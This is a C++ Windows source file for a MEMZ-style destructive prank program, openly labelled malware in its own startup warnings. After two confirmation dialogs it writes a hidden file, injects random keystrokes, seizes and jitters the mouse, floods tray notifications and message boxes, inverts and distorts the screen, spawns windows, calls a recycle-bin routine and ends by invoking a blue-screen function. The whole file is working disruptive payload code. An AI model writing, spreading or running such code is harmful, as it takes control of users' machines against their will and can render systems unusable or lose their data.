﻿#include"em.h"
#include"Window.h"
#include"BLUE SCREEN.h"
#include"Sound.h"
#include<limits>
#include<WinUser.h>
#include"resource.h"
typedef struct {
	int time;
	int(*func)();
}functable;
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	//TCHAR szStr[] = TEXT(" ");
	PAINTSTRUCT ps;
	HDC hdc, hdcMem;
	HBITMAP hBitmap;
	BITMAP bmp;
	HRSRC hRsrc;
	HINSTANCE m_hInstance;

	int x = LOWORD(lParam);
	int y = HIWORD(lParam);

	switch (uMsg)
	{
	case WM_PAINT:
		hdc = BeginPaint(hwnd, &ps);
		//TextOut(hdc, 10, 10, szStr, _tcslen(szStr));
		hdcMem = CreateCompatibleDC(hdc);
		hBitmap = (HBITMAP)LoadImage(NULL, /*TEXT("透明只因.bmp")*/TEXT("滑稽.bmp"), IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
		SelectObject(hdcMem, hBitmap);

		SetBkMode(hdcMem, TRANSPARENT);
		//TextOut(hdcMem, 10, 10, TEXT("鸡屎"), _tcslen(TEXT("鸡屎")));

		GetObject(hBitmap, sizeof(bmp), &bmp);
		BitBlt(hdc, 0, 0, bmp.bmWidth, bmp.bmHeight, hdcMem, 0, 0, SRCCOPY);

		EndPaint(hwnd, &ps);
		DeleteObject(hBitmap);
		DeleteDC(hdcMem);

		return 0;

	case WM_CREATE:
	{
		long exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
		exStyle = exStyle | WS_EX_LAYERED;
		SetWindowLong(hwnd, GWL_EXSTYLE, exStyle);
		SetLayeredWindowAttributes(hwnd, RGB(255, 255, 255), 0, LWA_COLORKEY);
	}

	case WM_LBUTTONDOWN:        // 点击拖动窗口
		if (x < 400 && y < 300)
		{
			SendMessage(hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0);    // 发送拖动消息
		}
		break;

	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?"
, "MEMZ", MB_YESNO | MB_ICONWARNING) == IDYES) {

		if (MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", "MEMZ", MB_YESNO | MB_ICONWARNING) == IDYES) {
			wnd.cbSize = sizeof(WNDCLASSEX);
			wnd.style = CS_HREDRAW | CS_VREDRAW;
			wnd.lpfnWndProc = WindowProc;
			wnd.cbClsExtra = 0;
			wnd.cbWndExtra = 0;
			wnd.hInstance = hInstance;
			wnd.hIcon = LoadIcon(NULL, IDI_APPLICATION);
			wnd.hCursor = LoadCursor(NULL, IDC_ARROW);
			wnd.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
			wnd.lpszMenuName = NULL;
			wnd.lpszClassName = szCLassName;
			wnd.hIconSm = NULL;
			RegisterClassEx(&wnd);
			//ffff

			HANDLE File = CreateFile(L"note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
			WriteFile(File, msgboxmsg, msg_len, &wd, NULL);
			SetFileAttributes(L"note.txt", FILE_ATTRIBUTE_HIDDEN);
			CloseHandle(File);
			ShellExecuteA(hwnd, "open", "notepad", "note.txt", NULL, SW_SHOWNORMAL);

			for (int i = 0; i < 100; i++)
			{
				ChangeTrayTip(hShell32, NIM_DELETE, NIFICON[random() % 3], LoadIcon(hShell32, MAKEINTRESOURCE(Shell32_Icon[random() % 16])), Info[random() % 6], Tip[random() % 6], i);
			}

			for (int i = 0; i < 30; i++)
			{
				ChangeTrayTip(hShell32, NIM_ADD, NIFICON[random() % 3], LoadIcon(hShell32, MAKEINTRESOURCE(Shell32_Icon[random() % 16])), Info[random() % 6], Tip[random() % 6], i);
				//ChangeTrayTip(hInstance, NIM_DELETE,NIIF_WARNING);
				interval(SRCCOPY);
			}

			for (int i = 0; i < 200; i++)
			{
				Input.type = INPUT_KEYBOARD;
				Input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
				SendInput(1, &Input, sizeof(INPUT));
				Sleep(25);
			}

			//二
			for (int i = 0; i < 800; i++)
			{
				Input.type = INPUT_KEYBOARD;
				Input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
				SendInput(1, &Input, sizeof(INPUT));
				GetCursorPos(&cursor);
				SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
				Sleep(5);
			}

			for (int i = 0; i < 25; i++)
			{
				RecycleBin(i);

				for (int j = 0; j < 40; j++)
				{
					GetCursorPos(&cursor);
					SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 10)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 10)));
					DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));
					Sleep(5);
				}
			}

			for (int i = 0; i < 9; i++)
			{
				PlaySound(lpSoundsName[random() % MAX_SOUNDS], GetModuleHandle(NULL), SND_SYNC);
				ShellExecute(NULL, L"open", lpExecuteName[random() % MAX_EXECUTE], NULL, NULL, SW_SHOW);

				for (int i = 0; i < 100; i++)
				{
					GetCursorPos(&cursor);
					SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
					DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));
				}
			}

			for (int i = 0; i < 15; i++)
			{
				interval(NOTSRCCOPY);
				for (int i = 0; i < 60; i++)
				{
					GetCursorPos(&cursor);
					SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
					DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));
					Sleep(8);
				}
			}

			for (int i = 0; i < 40; i++)
			{
				hThread = CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
				Sleep(100);
				HWND hlz = FindWindowA(NULL, "荔枝");

				SendMessage(hlz, WM_CLOSE, 0, NULL);
			}

			for (int i = 0; i < 20; i++)
			{
				interval(NOTSRCCOPY);

				for (int i = 0; i < 50; i++)
				{
					GetCursorPos(&cursor);
					SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
					DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));
					Sleep(8);
				}
			}

			for (int i = 0; i < 8; i++)
			{
				hThread = CreateThread(NULL, 4096, &MymessageBoxThread, hInstance, NULL, NULL);
				Sleep(100);
			}

			//一.二
			for (int i = 0; i < 15; i++)
			{
				interval(NOTSRCCOPY);
				Interval_Text();

				for (int i = 0; i < 50; i++)
				{
					GetCursorPos(&cursor);
					SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
					DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));

					Sleep(8);
				}

				for (int i = 0; i < 10; i++)
				{
					if (random() % 3 == 0)
					{
						GetCursorPos(&cursor);
						DrawIcon(hdc, (random() % cx * DPI(hwnd)), (random() % cy * DPI(hwnd)), LoadIcon(NULL, IDI_WARNING));
					}
				}
			}

			for (int i = 0; i < 10; i++)
			{
				hThread = CreateThread(NULL, 4096, &MymessageBoxThread, hInstance, NULL, NULL);
				Sleep(80);
			}

			//二.
			thread ec(恶臭);
			ec.detach();

			//thread pc(playcursor);
			//pc.detach();

			for (int i = 0; i < 40; i++)
			{
				interval(NOTSRCCOPY);
				tunnel_screen();

				for (int i = 0; i < 20; i++)
				{
					if (random() % 3 == 0)
					{
						GetCursorPos(&cursor);
						DrawIcon(hdc, (random() % cx * DPI(hwnd)), (random() % cy * DPI(hwnd)), LoadIcon(NULL, IDI_WARNING));
					}
				}

				for (int i = 0; i < 24; i++)
				{
					GetCursorPos(&cursor);
					SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
					DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));
					Sleep(10);
				} 
			}

			thread ec2(恶臭);
			ec2.detach();

			for (int i = 0; i < 50; i++)
			{
				interval(NOTSRCCOPY);
				tunnel_screen();
				Puzzle();

				for (int i = 0; i < 20; i++)
				{
					if (random() % 3 == 0)
					{
						GetCursorPos(&cursor);
						DrawIcon(hdc, (random() % cx * DPI(hwnd)), (random() % cy * DPI(hwnd)), LoadIcon(NULL, IDI_WARNING));
					}
				}

				for (int i = 0; i < 24; i++)
				{
					GetCursorPos(&cursor);
					SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
					DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));
					Sleep(10);
				}
			}

			//三
			thread ec3(恶臭);
			ec3.detach();

			for (int i = 0; i < 50; i++)
			{
				interval(NOTSRCCOPY);
				tunnel_screen();
				Puzzle();
				//Random_kun(hInstance, nCmdShow, random() % cx,random() % cy, 0);
				hwnd = CreateWindowEx(0,
					szCLassName, szAppName,
					WS_SYSMENU | WS_POPUP,
					random() % cx, random() % cy,
					400, 300, NULL, NULL,
					hInstance,
					NULL);
				ShowWindow(hwnd, nCmdShow);
				UpdateWindow(hwnd);

				for (int i = 0; i < 20; i++)
				{
					if (random() % 3 == 0)
					{
						GetCursorPos(&cursor);
						DrawIcon(hdc, (random() % cx * DPI(hwnd)), (random() % cy * DPI(hwnd)), LoadIcon(NULL, IDI_WARNING));
					}
				}

				for (int i = 0; i < 24; i++)
				{
					GetCursorPos(&cursor);
					SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)), cursor.y + (random() % 3 - 1) * (random() % (cursor_freq / 2200 + 5)));
					DrawIcon(hdc, cursor.x * DPI(hwnd), cursor.y * DPI(hwnd), LoadIcon(NULL, IDI_ERROR));
					Sleep(10);
				}
				SendMessage(hwnd1, WM_CLOSE, 0, 0);
			}
			//结束

			for (int i = 0; i < 10000; i++)
			{
				ChangeTrayTip(hShell32, NIM_DELETE, NIFICON[random() % 3], LoadIcon(hShell32, MAKEINTRESOURCE(Shell32_Icon[random() % 16])), Info[random() % 6], Tip[random() % 6], i);
			}

			for (int i = 0; i < 40; i++)
			{
				hThread = CreateThread(NULL, 4096, &MymessageBoxThread,hInstance, NULL, NULL);
				Sleep(50);
			}

			for (int i = 0; i < 50; i++)
			{
				hThread = CreateThread(NULL, 1.28, &WinverThread, NULL, NULL, NULL);
				DestroyWindow(hwnd);
				Sleep(40);
			}

			for (int i = 0; i < 100; i++)
			{
				IconCicurlOnce(); 
				//Melt(1,0);
			}

			Blackhole();
			Sleep(3000);

			blue();
		}

		else {
			ExitProcess(0);
		}
	}

	else
	{
		ExitProcess(0);
	}

	for (int i = 0; i < 10000; i++)
	{
		ChangeTrayTip(hShell32, NIM_DELETE, NIFICON[random() % 3], LoadIcon(hShell32, MAKEINTRESOURCE(Shell32_Icon[random() % 16])), Info[random() % 6], Tip[random() % 6], i);
	}

	for (int i = 0; i < 10000; i++)
	{
		ChangeTrayTip(hShell32, NIM_MODIFY, NIFICON[random() % 3], LoadIcon(hShell32, MAKEINTRESOURCE(Shell32_Icon[random() % 16])), Info[random() % 6], Tip[random() % 6], i);
	}

	ReleaseDC(hwnd, hdc);
	return 0;
}